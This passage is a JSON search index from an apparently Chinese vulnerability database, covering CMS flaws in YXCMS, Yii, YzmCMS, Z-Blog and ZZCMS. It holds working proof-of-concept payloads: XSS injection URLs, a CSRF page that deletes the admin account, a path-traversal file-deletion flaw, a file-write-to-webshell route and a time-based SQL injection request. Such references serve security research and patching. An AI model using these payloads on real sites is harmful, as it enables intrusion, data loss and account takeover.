</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5199\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#1","title":"1.\u5f71\u54cd\u7248\u672c","text":"<p>YXcms 1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#2","title":"2.\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002</p> <pre><code>/index.php?r=admin/set/tpadd&amp;Mname=default\n</code></pre> <p>\u65b0\u5efa\u6a21\u677f\u6587\u4ef6\uff1a  \u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u7684\u6587\u4ef6\u3002\u3002</p> <p>\u901a\u8fc7\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u627e\u5230\u65b0\u7684\u6a21\u677f\u6587\u4ef6\u7684\u4f4d\u7f6e\uff1a</p> <pre><code>/protected/apps/default/view/default/phpinfo.php\n</code></pre> <p> \u53ef\u4ee5\u770b\u5230\u662f\u6211\u4eec\u5199\u5165\u7684\u6587\u4ef6\u88ab\u6267\u884c\u4e86\uff0c\u6240\u6709\u53ef\u4ee5\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u6765\u8fdb\u884cgetshell\u3002\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff08\u4e00\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/#1","title":"1.\u5f71\u54cd\u7248\u672c","text":"<p>YXcms 1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/#2","title":"2. \u590d\u73b0\u8fc7\u7a0b","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u5728\u540e\u53f0</p> <p>\u770b\u5230\u4e86\u8fd9\u91cc\u6709\u4e00\u4e2a\u5220\u9664\u7684\u6309\u94ae</p> <p> \u70b9\u51fb\u5220\u9664\uff0c\u8fdb\u884c\u6293\u5305\uff1a</p> <p>\u901a\u8fc7\u63a7\u5236fname\u53c2\u6570\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u529f\u80fd</p> <p> \u4ee3\u7801\u5206\u6790</p> <p>\u4ee3\u7801\u4f4d\u7f6eprotected/apps/admin/controller/filesController.php\uff1a</p> <pre><code>public function del()\n{\n   $dirs=in($_GET['fname']);\n   $dirs=str_replace(',','/',$dirs);\n   $dirs=ROOT_PATH.'upload'.$dirs;\n   if(is_dir($dirs)){del_dir($dirs); echo 1;} \n   elseif(file_exists($dirs)){\n        if(unlink($dirs)) echo 1;\n   }else echo '\u6587\u4ef6\u4e0d\u5b58\u5728'; \n}\n</code></pre> <p>\u5bf9fname\u8fdb\u884c\u66ff\u6362\u64cd\u4f5cstr_replace(',','/',$dirs); \u8bb2\u53c2\u6570\u6700\u524d\u9762\u7684\u5206\u53f7(%2C)\u66ff\u6362\u4e3a/</p> <p>\u7136\u540e\u5b8c\u6574\u7684\u62fc\u63a5\u8def\u5f84\uff0c\u770b\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5b58\u5728\u5c31\u8fdb\u884c\u5220\u9664 \u8fd9\u91cc\u6ca1\u6709\u8bfb\u4f20\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c \u53ef\u4ee5\u53ca\u9006\u884c\u4e0a\u8df3\u76ee\u5f55\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u6548\u679c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff08\u4e8c\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/#1","title":"1.\u5f71\u54cd\u7248\u672c","text":"<p>1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/#2","title":"2.\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u6f0f\u6d1e\u4f4d\u7f6e\u8fd8\u5728\u540e\u53f0\uff1a</p> <p>\u5728\u5bf9\u6587\u7ae0\u7f16\u8f91\u7684\u9875\u9762\u4e0a\uff0c\u53d1\u73b0\u5b58\u5728\u5220\u9664\u5df2\u4e0a\u4f20\u7684\u56fe\u7247\u7684\u529f\u80fd  \u8bbe\u7f6e\u6293\u5305\uff0c\u70b9\u51fb\u5220\u9664\uff1a </p> <p>\u867d\u7136\u663e\u793a\u7684\u662f\u7f29\u7565\u56fe\u4e0d\u5b58\u5728\uff0c\u4f46\u662f\u901a\u8fc7\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u5220\u9664\u4e86123.txt\u8fd9\u4e2a\u6587\u4ef6</p> <p>\u4e5f\u662f\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/","title":"YXCMS 1.4.7\u50a8\u5b58\u578bxss","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#1","title":"1.\u5f71\u54cd\u7248\u672c","text":"<p>YXcms 1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#2","title":"2.\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u524d\u53f0\u6709\u7559\u8a00\u677f\u7684\u529f\u80fd\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff1a payload\uff1a</p> <pre><code>&lt;svg/onload=alert(1)&gt;\n</code></pre> <p>  \u5f53\u7ba1\u7406\u5458\u5728\u540e\u53f0\u67e5\u770b\u7559\u8a00\u7684\u65f6\u5019\uff0c\u5c31\u80fd\u89e6\u53d1<code>xss\uff1a</code>   \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2axss\u6765\u83b7\u53d6\u7ba1\u7406\u5458\u7684cookie\uff0c\u4ece\u800c\u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","title":"YXcms 1.4.7 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#1","title":"1.\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>YXcms 1.4.7\u7248\u672c\u4e2d\u7684protected/apps/admin/controller/adminController.php\u6587\u4ef6\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9index.php?r=admin/admin/admindel\u5229\u7528\u8be5\u6f0f\u6d1e\u5220\u9664\u7ba1\u7406\u5458\u8d26\u6237\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#2","title":"2.\u5f71\u54cd\u7248\u672c","text":"<p>YXcms 1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#3","title":"3. \u590d\u73b0\u8fc7\u7a0b","text":"<p>\u7ba1\u7406\u5458\u70b9\u51fb\u94fe\u63a5</p> <pre><code>http://192.168.232.133/evil.html\n</code></pre> <p>evil.html</p> <pre><code>&lt;html&gt; \n&lt;a href=\"http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&amp;id=1\"&gt;test&lt;/a&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"\u7b80\u4ecb","text":"<p>\u5982\u679c\u5728\u4f7f\u7528yii\u6846\u67b6\uff0c\u5e76\u4e14\u5728\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u5904\u8c03\u7528\u4e86unserialize()\u5e76\u5141\u8bb8\u7279\u6b8a\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u3002 \u8be5\u6f0f\u6d1e\u53ea\u662fphp \u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u94fe\uff0c\u5fc5\u987b\u8981\u914d\u5408unserialize\u51fd\u6570\u624d\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u8be5\u53cd\u5e8f\u5217\u5316\u6267\u884c\u94fe\u5728\u4eca\u5e748\u6708\u521d\u5df2\u7ecf\u516c\u5f00\uff0c\u5efa\u8bae\u4f7f\u7528yii\u6846\u67b6\u7684\u540c\u5b66\u6392\u67e5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Yii2 &lt;2.0.38</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","title":"\u4fee\u590d\u65b9\u6848","text":"<p>\u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u7981\u6b62BatchQueryResult\u7c7b\u88ab\u53cd\u5e8f\u5217\u5316</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#exp","title":"exp","text":"<p>  exp.txt CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316RCE\u5229\u7528\u94fe</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99 https://xz.aliyun.com/t/8082#toc-8 https://github.com/AFKL-CUIT/phpggc/</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","title":"YzmCMS 3.6\u5b58\u5728XSS\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 YzmCMS 3.6\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw (zzw@5ecurity.cn) http://www.yzmcms.com/ http://www.yzmcms.com/ 3.6 CVE-2018-7653"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>YzmCMS 3.6\u7248\u672c\u7684 index.php\u9875\u9762a\u3001c\u3001m\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>poc\u4ee3\u7801:</p> <pre><code>http://localhost/YzmCMS/index.php?m=search&amp;c=index&amp;a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs&amp;modelid=1&amp;q=tes \n\nhttp://localhost/YzmCMS/index.php?m=search&amp;c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck&amp;a=init&amp;modelid=1&amp;q=tes \n\nhttp://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf&amp;c=index&amp;a=init&amp;modelid=1&amp;q=tes \n\nhttp://localhost/YzmCMS/index.php?m=search&amp;c=index&amp;a=init&amp;modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0&amp;q=tes\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","title":"Z Blog 1.5.1.1740\u5b58\u5728XSS\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Z-Blog 1.5.1.1740\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw (zzw@5ecurity.cn) https://www.zblogcn.com/ https://github.com/zblogcn/zblogphp 1.5.1.1740 CVE-2018-7736"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Z-BlogPHP 1.5.1.1740\u7248\u672c\u7684cmd.php\u9875\u9762ZC_BLOG_SUBNAME\u53caZC_UPLOAD_FILETYPE\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>ZC_BLOG_SUBNAME\u53c2\u6570poc\u4ee3\u7801:</p> <pre><code>post_url\uff1ahttp://localhost/z-blog/zb_system/cmd.php?act=SettingSav&amp;token=2c7ca9a4c1c3d856e012595ca878564f\n\npost_data:\n\nZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&amp;ZC_PERMANENT_DOMAIN_ENABLE=&amp;ZC_PERMANENT_DOMAIN_WITH_ADMIN=&amp;ZC_BLOG_NAME=admin&amp;ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&amp;ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&amp;ZC_TIME_ZONE_NAME=Asia%2FShanghai&amp;ZC_BLOG_LANGUAGEPACK=zh-cn&amp;ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&amp;ZC_UPLOAD_FILESIZE=2&amp;ZC_DEBUG_MODE=&amp;ZC_GZIP_ENABLE=&amp;ZC_SYNTAXHIGHLIGHTER_ENABLE=1&amp;ZC_CLOSE_SITE=&amp;ZC_DISPLAY_COUNT=10&amp;ZC_DISPLAY_SUBCATEGORYS=1&amp;ZC_PAGEBAR_COUNT=10&amp;ZC_SEARCH_COUNT=20&amp;ZC_MANAGE_COUNT=50&amp;ZC_COMMENT_TURNOFF=&amp;ZC_COMMENT_AUDIT=&amp;ZC_COMMENT_REVERSE_ORDER=&amp;ZC_COMMENTS_DISPLAY_COUNT=100&amp;ZC_COMMENT_VERIFY_ENABLE=\n</code></pre> <p>ZC_UPLOAD_FILETYPE\u53c2\u6570poc\u4ee3\u7801:  </p> <pre><code>post_data:\n\nZC_BLOG_HOST=http://localhost/z-blog/&amp;ZC_PERMANENT_DOMAIN_ENABLE=&amp;ZC_PERMANENT_DOMAIN_WITH_ADMIN=&amp;ZC_BLOG_NAME=admin&amp;ZC_BLOG_SUBNAME=Good+Luck+To+You!&amp;ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&amp;ZC_TIME_ZONE_NAME=Asia/Shanghai&amp;ZC_BLOG_LANGUAGEPACK=zh-cn&amp;ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;ekkgh&amp;ZC_UPLOAD_FILESIZE=2&amp;ZC_DEBUG_MODE=&amp;ZC_GZIP_ENABLE=&amp;ZC_SYNTAXHIGHLIGHTER_ENABLE=1&amp;ZC_CLOSE_SITE=&amp;ZC_DISPLAY_COUNT=10&amp;ZC_DISPLAY_SUBCATEGORYS=1&amp;ZC_PAGEBAR_COUNT=10&amp;ZC_SEARCH_COUNT=20&amp;ZC_MANAGE_COUNT=50&amp;ZC_COMMENT_TURNOFF=&amp;ZC_COMMENT_AUDIT=&amp;ZC_COMMENT_REVERSE_ORDER=&amp;ZC_COMMENTS_DISPLAY_COUNT=100&amp;ZC_COMMENT_VERIFY_ENABLE=\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/","title":"ZZCMS201910 SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#zzcms201910-sql-injections-sql","title":"ZZCMS201910 SQL Injections SQL\u6ce8\u5165","text":"<p>\u524d\u63d0\u662f\u4f60\u6709\u4e00\u4e2a\u5177\u6709\u8d2d\u4e70\u6743\u9650\u7684VIP\u4f1a\u5458\u8d26\u6237 \u4e0d\u7136\u4f1a\u63d0\u793a\uff1a<code>\"\u60a8\u6240\u5728\u7684\u7528\u6237\u7ec4\u6ca1\u6709\u4e0b\u8f7d\u6b64\u4fe1\u606f\u7684\u6743\u9650\uff01&lt;br&gt;&lt;input  type=button value=\u5347\u7ea7\u6210VIP\u4f1a\u5458 onclick=\\\"location.href='/one/vipuser.php'\\\"/&gt;\"</code> </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#userdls_download-with-parameter-id","title":"\u6ce8\u5165\u70b9 <code>user/dls_download with parameter $id</code>","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#poc","title":"\u5229\u7528POC\u5982\u4e0b","text":"<pre><code>POST /user/dls_download.php HTTP/1.1\nHost: test.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: http://test.com\nConnection: close\nReferer: http://test.com/user/advzt_manage.php\nCookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93\nUpgrade-Insecure-Requests: 1\nPragma: no-cache\nCache-Control: no-cache\n\nid[]=1&amp;id[]=2)%0aor%0asleep(5)%23&amp;FileExt=xxx\n</code></pre> <p>\u6765\u6e90\u4e0e\uff1ahttps://github.com/JcQSteven/blog/issues/15</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2017-6920%29/","title":"About Drupal","text":"<p>Drupal\u662f\u4f7f\u7528PHP\u8bed\u8a00\u7f16\u5199\u7684\u5f00\u6e90\u5185\u5bb9\u7ba1\u7406\u6846\u67b6\uff08CMF\uff09\uff0c\u5b83\u7531\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff08CMS\uff09\u548cPHP\u5f00\u53d1\u6846\u67b6\uff08Framework\uff09\u5171\u540c\u6784\u6210\u3002\u8fde\u7eed\u591a\u5e74\u8363\u83b7\u5168\u7403\u6700\u4f73CMS\u5927\u5956\uff0c\u662f\u57fa\u4e8ePHP\u8bed\u8a00\u6700\u8457\u540d\u7684WEB\u5e94\u7528\u7a0b\u5e8f\u3002\u622a\u6b622011\u5e74\u5e95\uff0c\u5171\u670913,802\u4f4dWEB\u4e13\u5bb6\u53c2\u52a0\u4e86Drupal\u7684\u5f00\u53d1\u5de5\u4f5c\uff1b228\u4e2a\u56fd\u5bb6\u4f7f\u7528181\u79cd\u8bed\u8a00\u7684729,791\u4f4d\u7f51\u7ad9\u8bbe\u8ba1\u5de5\u4f5c\u8005\u4f7f\u7528Drupal\u3002\u8457\u540d\u6848\u4f8b\u5305\u62ec\uff1a\u8054\u5408\u56fd\u3001\u7f8e\u56fd\u767d\u5bab\u3001\u7f8e\u56fd\u5546\u52a1\u90e8\u3001\u7ebd\u7ea6\u65f6\u62a5\u3001\u534e\u7eb3\u3001\u8fea\u65af\u5c3c\u3001\u8054\u90a6\u5feb\u9012\u3001\u7d22\u5c3c\u3001\u7f8e\u56fd\u54c8\u4f5b\u5927\u5b66\u3001Ubuntu\u7b49\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6